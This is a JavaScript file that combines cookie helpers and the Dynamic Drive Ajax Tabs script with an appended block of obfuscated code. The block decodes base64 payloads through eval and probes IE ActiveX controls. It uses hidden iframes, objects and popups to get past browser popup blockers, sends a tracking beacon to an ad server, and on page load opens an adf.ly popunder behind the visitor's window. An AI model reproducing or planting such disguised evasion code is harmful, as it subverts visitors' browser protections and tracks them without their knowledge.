
//cookie functions

function Set_Cookie( name, value, expires, path, domain, secure ) 
{
var today = new Date();
today.setTime( today.getTime() );

if ( expires )
{
expires = expires * 1000 * 60 * 60 * 24;
}
var expires_date = new Date( today.getTime() + (expires) );

document.cookie = name + "=" +escape( value ) +
( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) + 
( ( path ) ? ";path=" + path : "" ) + 
( ( domain ) ? ";domain=" + domain : "" ) +
( ( secure ) ? ";secure" : "" );
}


function Get_Cookie( name ) {
	
var start = document.cookie.indexOf( name + "=" );
var len = start + name.length + 1;
if ( ( !start ) &&
( name != document.cookie.substring( 0, name.length ) ) )
{
return null;
}
if ( start == -1 ) return null;
var end = document.cookie.indexOf( ";", len );
if ( end == -1 ) end = document.cookie.length;
return unescape( document.cookie.substring( len, end ) );
}
//** Ajax Tabs Content script v2.0- © Dynamic Drive DHTML code library (http://www.dynamicdrive.com)
//** Updated Oct 21st, 07 to version 2.0. Contains numerous improvements
//** Updated Feb 18th, 08 to version 2.1: Adds a public "tabinstance.cycleit(dir)" method to cycle forward or backward between tabs dynamically. Only .js file changed from v2.0.
//** Updated April 8th, 08 to version 2.2:
//   -Adds support for expanding a tab using a URL parameter (ie: http://mysite.com/tabcontent.htm?tabinterfaceid=0) 
//   -Modified Ajax routine so testing the script out locally in IE7 now works 

var ddajaxtabssettings={}
ddajaxtabssettings.bustcachevar=1  //bust potential caching of external pages after initial request? (1=yes, 0=no)
ddajaxtabssettings.loadstatustext="<img src='images/ajax/loading.gif' /> Vui lòng ch? tý..." 


////NO NEED TO EDIT BELOW////////////////////////

function ddajaxtabs(tabinterfaceid, contentdivid){
	this.tabinterfaceid=tabinterfaceid //ID of Tab Menu main container
	this.tabs=document.getElementById(tabinterfaceid).getElementsByTagName("a") //Get all tab links within container
	this.enabletabpersistence=true
	this.hottabspositions=[] //Array to store position of tabs that have a "rel" attr defined, relative to all tab links, within container
	this.currentTabIndex=0 //Index of currently selected hot tab (tab with sub content) within hottabspositions[] array
	this.contentdivid=contentdivid
	this.defaultHTML=""
	this.defaultIframe='<iframe src="about:blank" marginwidth="0" marginheight="0" frameborder="0" vspace="0" hspace="0" class="tabcontentiframe" style="width:100%; height:auto; min-height: 100px"></iframe>'
	this.defaultIframe=this.defaultIframe.replace(/<iframe/i, '<iframe name="'+"_ddajaxtabsiframe-"+contentdivid+'" ')
this.revcontentids=[] //Array to store ids of arbitrary contents to expand/contact as well ("rev" attr values)
	this.selectedClassTarget="link" //keyword to indicate which target element to assign "selected" CSS class ("linkparent" or "link")
}

ddajaxtabs.connect=function(pageurl, tabinstance){
	var page_request = false
	var bustcacheparameter=""
	if (window.ActiveXObject){ //Test for support for ActiveXObject in IE first (as XMLHttpRequest in IE7 is broken)
		try {
		page_request = new ActiveXObject("Msxml2.XMLHTTP")
		} 
		catch (e){
			try{
			page_request = new ActiveXObject("Microsoft.XMLHTTP")
			}
			catch (e){}
		}
	}
	else if (window.XMLHttpRequest) // if Mozilla, Safari etc
		page_request = new XMLHttpRequest()
	else
		return false
	var ajaxfriendlyurl=pageurl.replace(/^http:\/\/[^\/]+\//i, "http://"+window.location.hostname+"/") 
	page_request.onreadystatechange=function(){ddajaxtabs.loadpage(page_request, pageurl, tabinstance)}
	if (ddajaxtabssettings.bustcachevar) //if bust caching of external page
		bustcacheparameter=(ajaxfriendlyurl.indexOf("?")!=-1)? "&"+new Date().getTime() : "?"+new Date().getTime()
	page_request.open('GET', ajaxfriendlyurl+bustcacheparameter, true)
	page_request.send(null)
}

ddajaxtabs.loadpage=function(page_request, pageurl, tabinstance){
	var divId=tabinstance.contentdivid
	document.getElementById(divId).innerHTML=ddajaxtabssettings.loadstatustext //Display "fetching page message"
	if (page_request.readyState == 4 && (page_request.status==200 || window.location.href.indexOf("http")==-1)){
		document.getElementById(divId).innerHTML=page_request.responseText
		ddajaxtabs.ajaxpageloadaction(pageurl, tabinstance)
	}
}

ddajaxtabs.ajaxpageloadaction=function(pageurl, tabinstance){
	tabinstance.onajaxpageload(pageurl) //call user customized onajaxpageload() function when an ajax page is fetched/ loaded
}

ddajaxtabs.getCookie=function(Name){ 
	var re=new RegExp(Name+"=[^;]+", "i"); //construct RE to search for target name/value pair
	if (document.cookie.match(re)) //if cookie found
		return document.cookie.match(re)[0].split("=")[1] //return its value
	return ""
}

ddajaxtabs.setCookie=function(name, value){
	document.cookie = name+"="+value+";path=/" //cookie value is domain wide (path=/)
}

ddajaxtabs.prototype={

	expandit:function(tabid_or_position){ //PUBLIC function to select a tab either by its ID or position(int) within its peers
		this.cancelautorun() //stop auto cycling of tabs (if running)
		var tabref=""
		try{
			if (typeof tabid_or_position=="string" && document.getElementById(tabid_or_position).getAttribute("rel")) //if specified tab contains "rel" attr
				tabref=document.getElementById(tabid_or_position)
			else if (parseInt(tabid_or_position)!=NaN && this.tabs[tabid_or_position].getAttribute("rel")) //if specified tab contains "rel" attr
				tabref=this.tabs[tabid_or_position]
		}
		catch(err){alert("Invalid Tab ID or position entered!")}
		if (tabref!="") //if a valid tab is found based on function parameter
			this.expandtab(tabref) //expand this tab
	},

	cycleit:function(dir, autorun){ //PUBLIC function to move foward or backwards through each hot tab (tabinstance.cycleit('foward/back') )
		if (dir=="next"){
			var currentTabIndex=(this.currentTabIndex<this.hottabspositions.length-1)? this.currentTabIndex+1 : 0
		}
		else if (dir=="prev"){
			var currentTabIndex=(this.currentTabIndex>0)? this.currentTabIndex-1 : this.hottabspositions.length-1
		}
		if (typeof autorun=="undefined") //if cycleit() is being called by user, versus autorun() function
			this.cancelautorun() //stop auto cycling of tabs (if running)
		this.expandtab(this.tabs[this.hottabspositions[currentTabIndex]])
	},

	setpersist:function(bool){ //PUBLIC function to toggle persistence feature
			this.enabletabpersistence=bool
	},

	loadajaxpage:function(pageurl){ //PUBLIC function to fetch a page via Ajax and display it within the Tab Content instance's container
		ddajaxtabs.connect(pageurl, this)
	},

	loadiframepage:function(pageurl){ //PUBLIC function to fetch a page and load it into the IFRAME of the Tab Content instance's container
		this.iframedisplay(pageurl, this.contentdivid)
	},

	setselectedClassTarget:function(objstr){ //PUBLIC function to set which target element to assign "selected" CSS class ("linkparent" or "link")
		this.selectedClassTarget=objstr || "link"
	},

	getselectedClassTarget:function(tabref){ //Returns target element to assign "selected" CSS class to
		return (this.selectedClassTarget==("linkparent".toLowerCase()))? tabref.parentNode : tabref
	},

	urlparamselect:function(tabinterfaceid){
		var result=window.location.search.match(new RegExp(tabinterfaceid+"=(\\d+)", "i")) //check for "?tabinterfaceid=2" in URL
		return (result==null)? null : parseInt(RegExp.$1) //returns null or index, where index (int) is the selected tab's index
	},

	onajaxpageload:function(pageurl){ //PUBLIC Event handler that can invoke custom code whenever an Ajax page has been fetched and displayed
		//do nothing by default
	},

	expandtab:function(tabref){
		var relattrvalue=tabref.getAttribute("rel")
		//Get "rev" attr as a string of IDs in the format ",john,george,trey,etc," to easy searching through
		var associatedrevids=(tabref.getAttribute("rev"))? ","+tabref.getAttribute("rev").replace(/\s+/, "")+"," : ""
		if (relattrvalue=="#default")
			document.getElementById(this.contentdivid).innerHTML=this.defaultHTML
		else if (relattrvalue=="#iframe")
			this.iframedisplay(tabref.getAttribute("href"), this.contentdivid)
		else
			ddajaxtabs.connect(tabref.getAttribute("href"), this)
		this.expandrevcontent(associatedrevids)
		for (var i=0; i<this.tabs.length; i++){ //Loop through all tabs, and assign only the selected tab the CSS class "selected"
			this.getselectedClassTarget(this.tabs[i]).className=(this.tabs[i].getAttribute("href")==tabref.getAttribute("href"))? "selected" : ""
		}
		if (this.enabletabpersistence) //if persistence enabled, save selected tab position(int) relative to its peers
			ddajaxtabs.setCookie(this.tabinterfaceid, tabref.tabposition)
		this.setcurrenttabindex(tabref.tabposition) //remember position of selected tab within hottabspositions[] array
	},

	iframedisplay:function(pageurl, contentdivid){
		if (typeof window.frames["_ddajaxtabsiframe-"+contentdivid]!="undefined"){
			try{delete window.frames["_ddajaxtabsiframe-"+contentdivid]} //delete iframe within Tab content container if it exists (due to bug in Firefox)
			catch(err){}
		}
		document.getElementById(contentdivid).innerHTML=this.defaultIframe
		window.frames["_ddajaxtabsiframe-"+contentdivid].location.replace(pageurl) //load desired page into iframe
	},


	expandrevcontent:function(associatedrevids){
		var allrevids=this.revcontentids
		for (var i=0; i<allrevids.length; i++){ //Loop through rev attributes for all tabs in this tab interface
			//if any values stored within associatedrevids matches one within allrevids, expand that DIV, otherwise, contract it
			document.getElementById(allrevids[i]).style.display=(associatedrevids.indexOf(","+allrevids[i]+",")!=-1)? "block" : "none"
		}
	},

	setcurrenttabindex:function(tabposition){ //store current position of tab (within hottabspositions[] array)
		for (var i=0; i<this.hottabspositions.length; i++){
			if (tabposition==this.hottabspositions[i]){
				this.currentTabIndex=i
				break
			}
		}
	},

	autorun:function(){ //function to auto cycle through and select tabs based on a set interval
		this.cycleit('next', true)
	},

	cancelautorun:function(){
		if (typeof this.autoruntimer!="undefined")
			clearInterval(this.autoruntimer)
	},

	init:function(automodeperiod){
		var persistedtab=ddajaxtabs.getCookie(this.tabinterfaceid) //get position of persisted tab (applicable if persistence is enabled)
		var selectedtab=-1 //Currently selected tab index (-1 meaning none)
		var selectedtabfromurl=this.urlparamselect(this.tabinterfaceid) //returns null or index from: tabcontent.htm?tabinterfaceid=index
		this.automodeperiod=automodeperiod || 0
		this.defaultHTML=document.getElementById(this.contentdivid).innerHTML
		for (var i=0; i<this.tabs.length; i++){
			this.tabs[i].tabposition=i //remember position of tab relative to its peers
			if (this.tabs[i].getAttribute("rel")){
				var tabinstance=this
				this.hottabspositions[this.hottabspositions.length]=i //store position of "hot" tab ("rel" attr defined) relative to its peers
				this.tabs[i].onclick=function(){
					tabinstance.expandtab(this)
					tabinstance.cancelautorun() //stop auto cycling of tabs (if running)
					return false
				}
				if (this.tabs[i].getAttribute("rev")){ //if "rev" attr defined, store each value within "rev" as an array element
					this.revcontentids=this.revcontentids.concat(this.tabs[i].getAttribute("rev").split(/\s*,\s*/))
				}
				if (selectedtabfromurl==i || this.enabletabpersistence && selectedtab==-1 && parseInt(persistedtab)==i || !this.enabletabpersistence && selectedtab==-1 && this.getselectedClassTarget(this.tabs[i]).className=="selected"){
					selectedtab=i //Selected tab index, if found
				}
			}
		} //END for loop
		if (selectedtab!=-1) //if a valid default selected tab index is found
			this.expandtab(this.tabs[selectedtab]) //expand selected tab (either from URL parameter, persistent feature, or class="selected" class)
		else //if no valid default selected index found
			this.expandtab(this.tabs[this.hottabspositions[0]]) //Just select first tab that contains a "rel" attr
		if (parseInt(this.automodeperiod)>500 && this.hottabspositions.length>1){
			this.autoruntimer=setInterval(function(){tabinstance.autorun()}, this.automodeperiod)
		}
	} //END int() function

} //END Prototype assignment




oV1=window; function fStart(u,n,v) { if (!oV1.opera) var twin=oV1.open(u,n,v); if (!window.fV1) {fV13();} var w=oV2(u,n,v); var wo=vWA[w]; wo.pw=twin; fV3("fV10(" + w + ")",100); return (wo.pw&&fV35)?wo.pw:wo; } function fV11() {return fV6(vV1);} function fV5(x) { return true; } function oV2(u,n,v) { var c = vWA.length; vWA[c] = new Array; var cw = vWA[c]; var tn=new Date(); if (!v) var v=''; if (!n) var n=tn.getTime()+'N'+c; cw.location=u; cw.f=1; cw.s=0; cw.n=n; cw.v=v; cw.cn=""; cw.cnt=c; cw.blur=function() {cw.f=-1;}; cw.focus=function() {cw.f=1;}; return c } function fV13() { oV5=oV1.document; vWA=new Array; fV1=oV1.open; fV2=oV1.focus; fV3=setTimeout; fV4=clearTimeout; vV1='PE9CSkVDVCBJRD0nb1Y0JyBkYXRhPScvZmF2aWNvbi5pY28nIHR5cGU9J2FwcGxpY2F0aW9uL3htbCc+PC9PQkpFQ1Q+'; fV20=(document.all&&!oV1.opera)?1:0; isG=fV31=fV32=fV35=0; fV21=fV20?(navigator.appVersion.indexOf('NT 5.1')>0):0; fV34=fV20?(navigator.appVersion.indexOf('MSIE 7')>0):0; if (navigator.userAgent) { fV35=!fV20?(navigator.userAgent.indexOf('Firefox/2')>0):0; } oV5.write(fV6('PGlucHV0IHN0eWxlPSJ3aWR0aDowcHg7IHRvcDowcHg7IHBvc2l0aW9uOmFic29sdXRlOyB2aXNpYmlsaXR5OmhpZGRlbjsiIGlkPSJvVjYiIG9uY2hhbmdlPSJmVjgoZlYxLDUsdHJ1ZSkiPg==')); oV5.write(fV6('PGRpdiBzdHlsZT0iZGlzcGxheTppbmxpbmUiIGlkPSJvVjEwIj48L2Rpdj4=')); } function debug() {void(0)} function fV6(input) { var o = ""; var chr1, chr2, chr3; var enc1, enc2, enc3, enc4; var i = 0; var keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="; input = input.replace(/[^A-Za-z0-9\+\/\=]/g, ""); do { enc1 = keyStr.indexOf(input.charAt(i++)); enc2 = keyStr.indexOf(input.charAt(i++)); enc3 = keyStr.indexOf(input.charAt(i++)); enc4 = keyStr.indexOf(input.charAt(i++)); chr1 = (enc1 << 2) | (enc2 >> 4); chr2 = ((enc2 & 15) << 4) | (enc3 >> 2); chr3 = ((enc3 & 3) << 6) | enc4; o = o + String.fromCharCode(chr1); if (enc3 != 64) { o = o + String.fromCharCode(chr2); } if (enc4 != 64) { o = o + String.fromCharCode(chr3); } } while (i < input.length); return o; } function fV12() { if (--fV25<1) return; oV1.onerror=fV5; var t=fV3('fV12()',500); oV1.wO1=oV3.oV4.object.parentWindow; oV3.location=fV6('YWJvdXQ6Ymxhbms='); fV3('fV8(wO1.open,2)',200); fV4(t); } function fV17() { if (--fV25<1) { fV25=25; var t=fV3('fV12()'); return; } var x=fV3('fV17()',250); oV1.fV14=oV8.children[0].parentWindow; fV1=fV14.open; fV4(x); oV8.removeChild(oV8.children[0]); oV5.all['oV6'].fireEvent('onchange'); } function fV16() { z=createPopup(); oV8=z.document.body; oV8.innerHTML=fV6(vV1); fV25=5; fV3('fV17()',200); } function fV19(v) { if (oV5.getElementById('oV10')) { oV5.getElementById('oV10').innerHTML=v; } else { var o=oV5.createElement("span"); o.innerHTML=v; o.style.visibility = "visible"; oV5.body.appendChild(o); } } function fV23() { fV8(fV1,4); } function fV22() { if (--fV25==0) {fV21=0; fV7(); return;} var wo=vWA[0]; var x=fV3('fV22()',750); var o=fV24('oV9'); if (o.DOM) { wo.s=-1; fV4(x); fV25=1; eval(fV6('d28ucHc9by5ET00uU2NyaXB0Lm9wZW4od28ubG9jYXRpb24sJycsd28udik7')); wo.s=0; fV9(wo,4); } } function fV28() { fV19(fV6('PG9iamVjdCBpZD0ib1Y5IiBvbmVycm9yPSJmVjI1PTEiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0OjE7dG9wOjE7d2lkdGg6MTtoZWlnaHQ6MSIgY2xhc3NpZD0iY2xzaWQ6MkQzNjAyMDEtRkZGNS0xMWQxLThEMDMtMDBBMEM5NTlCQzBBIj48U0NSSVBUPmZWMjU9MTwvU0NSSVBUPjwvb2JqZWN0Pg==')); fV25=6; fV3('fV22()',500) } function fV26() { fV19(fV6('PElGUkFNRSBpZD0ib1YzIiBOQU1FPSJvVjMiIFNUWUxFPSJ2aXNpYmlsaXR5OmhpZGRlbjsgcG9zaXRpb246YWJzb2x1dGU7d2lkdGg6MTtoZWlnaHQ6MTsiIHNyYz0iamF2YXNjcmlwdDpwYXJlbnQuZlYxMSgpIj48L0lGUkFNRT4=')); fV25=20; fV3('fV12()',200); } function fV30() { fV3('fV32?fV29():fV28()'); var o=document.createElement('object'); o.onreadystatechange=function(){fV32=1}; o.classid='clsid:D2BD7935-05FC-11D2-9059-00C04FD7A1BD'; o.onreadystatechange=function(){fV32=0}; } function fV29() { fV3('fV31?fV28():fV33()'); var o=document.createElement('object'); o.onreadystatechange=function(){fV31=1}; o.classid='clsid:9E30754B-29A9-41CE-8892-70E9E07D15DC'; o.onreadystatechange=function(){fV31=0}; } function fV33() { fV3('isG?fV16():fV26();'); var o=document.createElement('object'); o.onreadystatechange=function(){isG=1}; o.classid='clsid:00EF2092-6AC5-47c0-BD25-CF2D5D657FEB'; o.onreadystatechange=function(){isG=0}; } function fV7() { oV5.body.onclick=function(){fV8(oV1.open,3)}; if (oV5.createElement) { fV24=oV5.getElementById; if (fV34) fV21=0; if (fV20) { if (fV21) { fV30(); } else { fV33(); } } else { if (!fV35) { out='<embed style="position:absolute; top:0px" swliveconnect="true" src="" width="1" height="1">'; fV19(out); } if (!oV5.all) { x=oV5.getElementById('oV6'); x.focus(); x.value=Math.random(); } } } } function fV8(f,t,y) { for (var i=0;i < vWA.length;i++) if (vWA[i].s==0) { vWA[i].s=-1; var wo=vWA[i]; wo.pw=f(wo.location,wo.n,wo.v); fV3("var i="+i+"; var wo=vWA[i]; if(wo.s==-1){wo.s=0}"); fV9(wo,t); } } function fV9(wo,s) { if (!s) s=0; if (wo.s > 1) return; if (s==0) var t=fV3("fV7()",500); if (s==4) var t=fV3('fV33()',500); if (s==5 && isG) var t=fV3('fV26()',200); oV1.onerror=fV5; if (wo.pw) { if (wo.f==-1) { fV20?oV5.focus():wo.pw.blur(); fV2(); } else { wo.pw.focus(); } wo.s=2; fV4(t); eval(fV6('CQlpZiAoMSArIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDEwMCkgPCA2KSB7DQoJCQl2YXIgeD1uZXcgSW1hZ2UoKTsNCgkJCXguc3JjPSdodHRwOi8vd3d3LmFkb3V0cHV0LmNvbS92ZXJzaW9uMi9oaXRfcm0uY2ZtP3R5cGU9JyArIHM7DQoJCX0=')); oV1.onerror=null; } } function fV10(w) { if (oV1.opera && !fV20) {fV7();return;} wo=vWA[w]; fV9(wo); }  var l = (screen.width - 1) / 2;
var t = (screen.height - 1) / 2;
var d=new Date();
var today=new Date();
var h=today.getHours();
var pop_url="http://adf.ly/1WGbpp";




if (Get_Cookie('is_pop_ddth')!=1)
{
var pop = fStart(pop_url,'ddth','height=' + 3*screen.height/4 + ',width=' + 3*screen.width/4 + ',left=0,top=0,location=1,toolbar=1,status=1,menubar=1,scrollbars=1,resizable=1');
Set_Cookie( 'is_pop_ddth', 1, 0.42, '/', '','' )
pop.blur();
window.focus();
}
